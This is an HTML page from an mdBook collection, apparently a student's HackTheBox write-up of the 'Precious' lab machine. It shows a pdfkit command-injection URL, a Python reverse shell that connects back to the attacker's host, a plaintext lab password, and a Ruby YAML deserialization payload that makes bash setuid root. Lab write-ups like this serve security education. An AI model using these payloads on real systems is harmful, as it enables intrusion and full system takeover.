@@ -1,0 +1,320 @@
+<!DOCTYPE HTML>
+<html lang="pt" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>HTB-Linux-Easy-Precious - WriteUps HackTheBox - by JavaliMZ</title>
+
+
+        <!-- Custom HTML head -->
+        <!-- Content here gets appended to the <html><head> of all the pages -->
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+        <script
+        	async
+        	src='https://www.googletagmanager.com/gtag/js?id=G-ZCM4NEDCZB'
+        ></script>
+        <script>
+        	window.dataLayer = window.dataLayer || []; function
+        	gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config',
+        	'G-ZCM4NEDCZB');
+        </script>
+        <!-- Custom HTML head: Twitter support -->
+        <script
+        	async
+        	src='https://platform.twitter.com/widgets.js'
+        	charset='utf-8'
+        ></script>
+        
+        <meta
+        	name='google-site-verification'
+        	content='g05a2qliKESUMKBSl7XG8sosQoaFtDugS6F9MlUbe1Y'
+        />
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="theme/css/additional.css">
+
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item "><a href="index.html"><strong aria-hidden="true">1.</strong> Introdução</a></li><li class="chapter-item "><a href="Windows.html"><strong aria-hidden="true">2.</strong> Máquinas Windows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="HTB-Windows-Easy-Omni.html"><strong aria-hidden="true">2.1.</strong> HTB-Windows-Easy-Omni</a></li><li class="chapter-item "><a href="HTB-Windows-Easy-Sauna.html"><strong aria-hidden="true">2.2.</strong> HTB-Windows-Easy-Sauna</a></li><li class="chapter-item "><a href="HTB-Windows-Medium-Resolute.html"><strong aria-hidden="true">2.3.</strong> HTB-Windows-Medium-Resolute</a></li><li class="chapter-item "><a href="HTB-Windows-Medium-Cascade.html"><strong aria-hidden="true">2.4.</strong> HTB-Windows-Medium-Cascade</a></li><li class="chapter-item "><a href="HTB-Windows-Hard-Blackfield.html"><strong aria-hidden="true">2.5.</strong> HTB-Windows-Hard-Blackfield</a></li><li class="chapter-item "><a href="HTB-Windows-Insane-Bankrobber.html"><strong aria-hidden="true">2.6.</strong> HTB-Windows-Insane-Bankrobber</a></li><li class="chapter-item "><a href="HTB-Windows-Insane-APT.html"><strong aria-hidden="true">2.7.</strong> HTB-Windows-Insane-APT</a></li></ol></li><li class="chapter-item expanded "><a href="Linux.html"><strong aria-hidden="true">3.</strong> Máquinas Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="HTB-Linux-Easy-Pandora.html"><strong aria-hidden="true">3.1.</strong> HTB-Linux-Easy-Pandora</a></li><li class="chapter-item expanded "><a href="HTB-Linux-Easy-Precious.html" class="active"><strong aria-hidden="true">3.2.</strong> HTB-Linux-Easy-Precious</a></li><li class="chapter-item "><a href="HTB-Linux-Hard-Falafel.html"><strong aria-hidden="true">3.3.</strong> HTB-Linux-Hard-Falafel</a></li><li class="spacer"></li></ol></li><li class="chapter-item "><a href="Projetos-Antigos.html"><strong aria-hidden="true">4.</strong> Projetos Antigos de programação em puro Javascript</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">WriteUps HackTheBox - by JavaliMZ</h1>
+
+                    <div class="right-buttons">
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <p><img src="Assets%5CHTB-Linux-Easy-Precious.html" alt="" /></p>
+<img src="https://img.shields.io/badge/Precious-HackTheBox-green?style=plastic" width="200">
+<h1 id="writeup-precious"><a class="header" href="#writeup-precious">Writeup: <strong>Precious</strong></a></h1>
+<h4 id="easy-machine-hacktheboxcom"><a class="header" href="#easy-machine-hacktheboxcom">EASY machine (hackthebox.com)</a></h4>
+<h4 id="by-sylvain-javalimz-júlio---30122022"><a class="header" href="#by-sylvain-javalimz-júlio---30122022">by <strong>Sylvain <em>&quot;JavaliMZ&quot;</em> Júlio</strong> - 30/12/2022</a></h4>
+<hr />
+<hr />
+<h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
+<p>This writeup was made for 2 purposes. Normally, my writeups are in Portuguese, but this time, I do it in English because I am in a Cyber Security degree, and I need to do an assignment for English class in the 2022 winter break. The assignment was to summarize and explain 3 good articles about something we like, but I didn't know what to choose, so I decided to make the &quot;Precious&quot; machine from HTB and read some articles about the machine's vulnerabilities. Also, teacher Maria's goal is to keep us interested and active in English, so I think I'm respecting the global rules =).</p>
+<p>For this time, I don't go to talk about possible ways to find something or explain different stuffs that not in the machine, because it's already a lot of work write and think in English. I just go to talk about the machine and the way to get Administrator of the machine, and only that.</p>
+<p>I try to do a lot of analogies to the real world for my teacher don't get too lost xD. I will try to do my best</p>
+<h1 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h1>
+<p>Like every machine, we need to know where to get in. HTB give us the IP address but, we don't know nothing more. The IP address is like a house, but we need to figure out where are the doors to get in. In a machine, the doors are called &quot;Ports&quot;. They are always 65355 ports in all machines. It is a lot!! But we are not knock on all the ports manually... For that we have a tool called <strong>nmap</strong>.</p>
+<p>First, we need to confirm that we can reach the IP:</p>
+<pre><code class="language-bash">ping -c 1 10.10.11.189
+    # PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.
+    # 64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=72.5 ms
+
+    # --- 10.10.11.189 ping statistics ---
+    # 1 packets transmitted, 1 received, 0% packet loss, time 0ms
+    # rtt min/avg/max/mdev = 72.530/72.530/72.530/0.000 ms
+</code></pre>
+<p>We send a ICMP packet, and the target machine send it back. With the <strong>ping</strong> command (like ping pong), we know the machine is alive and we can start scanning the ports. We noticed one more thing with ping command. The result gives us TTL (Time to Live) and refers to the number of hops that a packet is allowed to make before it is discarded. When a packet run through the Internet, every time this packet passes through a route, the router decrements this value by 1. For Windows, TTL starts at 128, and for Linux, TTL starts at 64. We can use this information by approximation to know the OS of the target machine. In this case, is likely a Linux machine. It is important for future commands on the target machine.</p>
+<p><img src="Assets/HTB-Linux-Easy-Precious/EnumerationAllPorts.png" alt="Enumeration all ports" /></p>
+<p>With the response of the big <strong>nmap</strong> command, we know that on the target machine, we got 2 ports open: port 22 and port 80. Normally, port 22 is for a server SSH and the port 80 is for a Web Server. The server SSH is a remote secure shell, for interact my command line with the machine when we connect in with the right credentials. We don't have any credentials so we can't do nothing here. We just have one more port. The Web Server.</p>
+<p>Before we start locking the Website, we can do a more powerful scan, with <strong>nmap</strong> too.</p>
+<p><img src="Assets/HTB-Linux-Easy-Precious/EnumerationTargeted.png" alt="Enumeration targeted ports" /></p>
+<p>This new command gives us more information. The Webserver redirect us to http://precious.htb/, but that Website don't exist. We know the site is on this IP but the Webserver want us to get in by the URL http://precious.htb/. We can do that by saying to our machine that the IP for this URL is the IP of the target machine. For that, we can edit as root (Super User) the file <strong>/etc/hosts</strong> and add the line:</p>
+<pre><code class="language-bash">echo &quot;10.10.11.189\tprecious.htb&quot; &gt;&gt; /etc/hosts
+</code></pre>
+<p>Now, we can access the Website:</p>
+<p><img src="Assets/HTB-Linux-Easy-Precious/WebSite.png" alt="Website" /></p>
+<p>It is an website to convert Websites to PDF. We can do some basic tests to get more information about the Website. We can try to serve a Webserver and enter the new URL to see what happens:</p>
+<pre><code class="language-bash">python -m http.server 80
+</code></pre>
+<p>This is a really simple Webserver, but it is enough for us. We can enter our URL <strong>(http://10.10.14.144/)</strong> to our Webserver and see what happens:</p>
+<p><img src="Assets/HTB-Linux-Easy-Precious/pdfDownload.png" alt="pdf Download" /></p>
+<p>We can see that the Website download a PDF file. Visually, it is just a simples PDF. But if we use a tool like <strong>exiftool</strong> to see the metadata of the PDF, we can see more...</p>
+<p><img src="Assets/HTB-Linux-Easy-Precious/Exiftool.png" alt="pdf Metadata" /></p>
+<h1 id="exploit---remote-code-execution"><a class="header" href="#exploit---remote-code-execution">Exploit - Remote Code Execution</a></h1>
+<p>We can see that the PDF Creator is a tool called <strong>pdfkit v0.8.6</strong>. This version is vulnerable and we got a RCE (Remote Code Execution). We can see more about this vulnerability <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">here</a>. To exploit this vulnerability, it is simple! We just need to add to the URL a param called <strong>?user</strong> and give a &quot;space&quot; but encoded (a space like %20 is the URL code for a space of the space bar). Next, we need to concatenate a <em>bash</em> code (because is a Linux Machine) with the special symbol <strong>`</strong> around the code for execute it like if we are in a command line shell. The command we will try is a single ping to our machine. The final URL will be:</p>
+<blockquote>
+<p>http://10.10.14.144/?name=%20<code>ping -c 1 10.10.14.144</code></p>
+</blockquote>
+<pre><code class="language-bash"># Set up a listener to capture the ping
+sudo tcpdump -i tun0 icmp
+</code></pre>
+<p>We got a ping back! I also create a tiny script in Python to have a fast way to try remote code execution:</p>
+<pre><code class="language-python">import requests
+
+while True:
+    cmd = input(&quot;[fAkeSh3ll ~] &gt; &quot;)
+    data = {
+        'url': f&quot;http://10.10.14.144/?name=%20`{cmd}`&quot;,
+        }
+
+    response = requests.post('http://precious.htb/', data=data, verify=False)
+</code></pre>
+<p>Now, we can try to get a reverse shell. A reverse shell is a type of connection to get a shell in the target machine. But the way we got this is tricky. We need to find a way to the target machine send is own shell to our machine. Is like we try to enter in a house, and we need to find a way that the house open his own door to give us the access... The command worked on the machine was this:</p>
+<pre><code class="language-bash">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.144&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<p>So, if we want to do that on the Website, we need to send this url:</p>
+<pre><code class="language-bash">http://10.10.14.144/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.144&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)'`
+</code></pre>
+<p>The query needs to be that exact and we need to adapt the IP and the port, and we need to setup a listener to capture the shell.</p>
+<p><img src="Assets/HTB-Linux-Easy-Precious/ReverseShell.png" alt="Reverse Shell" /></p>
+<h1 id="foothold"><a class="header" href="#foothold">Foothold</a></h1>
+<p>We are in the machine. But we have low privilege. We need more!! HUAAHAHA</p>
+<p>Digging through the folders and files, we'll find credentials for a service used by the user henry.</p>
+<p><img src="Assets/HTB-Linux-Easy-Precious/henryCredentials.png" alt="henry credentials" /></p>
+<p>And like 99,9% of people, we can try if the user henry has the same password for is user account. And it works!</p>
+<pre><code class="language-bash">su henry
+# Q3c1AqGHtoI0aXAYFH
+</code></pre>
+<h1 id="privilege-escalation"><a class="header" href="#privilege-escalation">Privilege Escalation</a></h1>
+<p>We got a little more privileges. But it is not enough!! WE NEED MORE AGAIN!!!!</p>
+<p><img src="Assets/HTB-Linux-Easy-Precious/sudoPermission.png" alt="Sudo permissions" /></p>
+<p>The sudo command is a command to execute another command as root privileges. And <strong>sudo -l</strong> inform us that the user <strong>henry</strong> can execute <em><strong>/usr/bin/ruby /opt/update_dependencies.rb</strong></em> as root. When we examine the update_dependencies.rb file, we realize that the script use &quot;YAML.load&quot; to load that file. That means the file will be deserialized. deserialization is like converting the syntax of the content of the file into object in ruby (in this case). But like in a lot of languages, deserialization can be dangerous... And in this case, we can create our own YAML file to execute a command as root. We can find a good article <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization">here</a> but for python, and <a href="https://www.elttam.com/blog/ruby-deserialization/#content">here</a> in ruby. But the code we will use is <a href="https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565">here</a>.</p>
+<p><img src="Assets/HTB-Linux-Easy-Precious/CEwithRootPriv.png" alt="Code execution as root" /></p>
+<p>We just create a file caller <strong>test.txt</strong> for confirm that the code is working. And it works! We can execute command as root. Now, we need a way to get root shell. They are so many ways, but I like this one: I will change permissions on the /usr/bin/bash program to execute it as the owner of the program. The owner of the program is root. So, if we execute the program, we will get a root shell. The code we will use is:</p>
+<pre><code class="language-bash">---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &amp;1 !ruby/object:Net::BufferedIO
+      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: &quot;abc&quot;
+      debug_output: &amp;1 !ruby/object:Net::WriteAdapter
+         socket: &amp;1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: chmod +s /usr/bin/bash
+         method_id: :resolve 
+</code></pre>
+<p>Now, we just need to execute the sudo command, and the <strong>bash</strong> program will be altered. And we can execute bash as root with a special flag:</p>
+<pre><code class="language-bash">sudo /usr/bin/ruby /opt/update_dependencies.rb
+bash -p
+</code></pre>
+<p><img src="Assets/HTB-Linux-Easy-Precious/RootAndFlags.png" alt="Root shell" /></p>
+<h1 id="conclusion"><a class="header" href="#conclusion">Conclusion</a></h1>
+<p>This machine was easy to get in, and the privilege escalation was a little more complex. But it was a good machine to learn more about Ruby and YAML. I hope you enjoyed this writeup. Fun fact: the machine is called Precious because it is a reference to the ruby programming language. Both vulnerabilities are related to the ruby language.</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="HTB-Linux-Easy-Pandora.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next" href="HTB-Linux-Hard-Falafel.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="HTB-Linux-Easy-Pandora.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next" href="HTB-Linux-Hard-Falafel.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </body>
+</html>
